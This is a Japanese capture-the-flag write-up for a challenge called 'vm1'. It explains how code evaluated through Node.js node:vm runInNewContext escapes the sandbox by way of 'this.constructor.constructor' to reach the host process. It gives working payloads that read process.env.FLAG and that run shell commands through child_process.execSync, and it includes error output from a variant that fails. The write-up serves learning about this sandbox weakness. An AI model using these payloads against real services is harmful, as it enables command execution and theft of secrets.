# vm1

## / Overview

仮想マシンからの脱出と環境変数の表示

サーバに接続すると入力を求められ、`node:vm`の`runInNewContext`でJavaScriptとして評価されます。

仮想マシンから本体の環境変数にアクセスできればクリアとなります。

## / Writeup

t-chenさんが分かりやすい解説記事を出しているので、改めて僕が解説する必要はないのですが、復習のために書かせていただきます[[1]](https://zenn.dev/tchen/articles/8999302b0953b3)。

まず、JavaScriptにはRealmと呼ばれる環境分離の仕組みがあり、今回で言えば「仮想マシン」と「本体」は別のRealmになります。この時、組み込みオブジェクトやグローバルオブジェクト/変数は分離され、お互いにアクセスできません。

しかし`this`は違います。仮想マシン内で`this`が呼ばれた時、**runInNewContextに渡された第2引数のContextObject**を参照します。これは本体側のオブジェクトですので、Realmを横断したアクセスができたことになります[[2]](https://nodejs.org/docs/latest-v26.x/api/vm.html#vmruninnewcontextcode-contextobject-options)。

> `ContextObject` `<Object>` | `<vm.constants.DONT_CONTEXTIFY>` | `<undefined>`
>  Either vm.constants.DONT_CONTEXTIFY or an object that will be contextified. If undefined, an empty contextified object will be created for backwards compatibility.

つまりこのオブジェクトの`.constructor.constructor`は本体の`Function`オブジェクトです。一方、`console`はVMのコンテキストに注入されたオブジェクトですが、そのプロトタイプチェーンはVM側のRealmに属するため、`.constructor.constructor`はVM内の`Function`を返します。この対比によって両者が別Realmの`Function`であることを確認できます。

```js
this.constructor.constructor === console.constructor.constructor // false
```

さて、あとは`Function`から`process`オブジェクトを取得し`child_process`を呼び出す、、、というお決まりの流れを試したいのですが、以下の有名なペイロードでは失敗します。

```js
this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ls -al")
```
```
evalmachine.<anonymous>:1
this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ls -al")
                                                           ^

TypeError: Cannot read properties of undefined (reading 'require')
    at evalmachine.<anonymous>:1:60
    at Script.runInContext (node:vm:149:12)
    at Script.runInNewContext (node:vm:154:17)
    at runInNewContext (node:vm:310:38)
    at Socket.<anonymous> (file:///app/jail.js:5:15)
    at Socket.emit (node:events:509:20)
    at addChunk (node:internal/streams/readable:568:12)
    at readableAddChunkPushByteMode (node:internal/streams/readable:519:3)
    at Readable.push (node:internal/streams/readable:399:5)
    at Pipe.onStreamRead (node:internal/stream_base_commons:189:23)

Node.js v26.2.0
```

これはnode 26がCJSからESMとして実行されるようになったことで、`process`オブジェクトが持つ`mainModule`という値がなくなったためです。`process.mainModule`が`undefined`なので、その先の`.require`にアクセスしようとして例外が発生しています。

> [!TIP]
> Node.jsにはモジュールの読み込み方式が2種類あります。
> `const fs = require("fs")`と書くCommonJS (CJS) では`process.mainModule`にモジュール情報が格納されますが、
> `import fs from "fs"`と書くECMAScript Modules (ESM) では`process.mainModule`は存在しません。

しかし、環境変数を呼び出すだけなら`process.env.FLAG`で大丈夫なので、これでクリアできます。

```js
this.constructor.constructor("return process")().env.FLAG // Alpaca{...}
```

さらにRCEをするにはt-chenさんの記事で紹介されているペイロードが使えます。具体的には

```js
this.constructor.constructor('return process')().getBuiltinModule('child_process').execSync('ls -la').toString()
```

が有効です。

## / Reference

- [1] 【絶対ダメ】node:vmモジュールをサンドボックスとして使ってみた！！！！ https://zenn.dev/tchen/articles/8999302b0953b3
- [2] VM (executing JavaScript) | Node.js v26.3.0 Documentation https://nodejs.org/docs/latest-v26.x/api/vm.html#vmruninnewcontextcode-contextobject-options